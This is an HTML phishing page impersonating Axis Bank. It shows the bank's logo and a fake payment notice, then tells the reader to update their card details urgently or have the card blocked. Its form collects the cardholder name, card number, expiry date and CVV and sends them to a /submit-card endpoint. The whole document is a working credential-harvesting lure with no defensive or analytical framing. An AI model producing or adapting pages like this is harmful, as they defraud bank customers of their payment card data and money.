<!DOCTYPE html>
<html>
<head>
	<title>Card Input Page</title>
	<style>
		/* Add styles to the input fields and submit button */
		input[type=text], input[type=password], select {
			width: 100%;
			padding: 12px 20px;
			margin: 8px 0;
			display: inline-block;
			border: 1px solid #ccc;
			border-radius: 4px;
			box-sizing: border-box;
		}

		input[type=submit] {
			width: 100%;
			background-color: #4CAF50;
			color: white;
			padding: 14px 20px;
			margin: 8px 0;
			border: none;
			border-radius: 4px;
			cursor: pointer;
		}

		/* Style the container */
		.container {
			border-radius: 5px;
			background-color: #f2f2f2;
			padding: 20px;
			width: 50%;
			margin: 0 auto;
		}

		/* Add styles to the logo */
		.logo {
			display: block;
			margin: 0 auto;
			max-width: 100%;
			height: auto;
			padding: 20px;
		}
	</style>
</head>
<body>
	<div class="container">
		<img class="logo" src="https://www.logo.wine/a/logo/Axis_Bank/Axis_Bank-Logo.wine.svg" alt="Axis Bank logo">
		<p>We have received a payment of  INR 72560.76 on your credit card ending with XXXX17 from Axis bank A/c XX1575 on 01-12-24 16:57:13</p>
		<h2>FOR SECURITY REASON UPDATE YOUR CARD DETAILS</h2>
		<H3>To avoid being blocked your card, kindly submit these form immedietly
		</H3>
		<form action="/submit-card" method="POST">
			<label for="name">Name on Card</label>
			<input type="text" id="name" name="name" placeholder="Enter your name" required>

			<label for="cardnumber">Card Number</label>
			<input type="text" id="cardnumber" name="cardnumber" placeholder="Enter your card number" required>

			<label for="expiry">Expiry Date</label>
			<input type="text" id="expiry" name="expiry" placeholder="Enter your card's expiry date (MM/YY)" required>

			<label for="cvv">CVV</label>
			<input type="password" id="cvv" name="cvv" placeholder="Enter your card's CVV" required>

			<label for="cardtype">Card Type</label>
			<select id="cardtype" name="cardtype">
				<option value="visa">Visa</option>
				<option value="mastercard">Mastercard</option>
				<option value="amex">American Express</option>
			</select>

			

			<input type="submit" value="Submit">
		</form>
	</div>
</body>
</html>
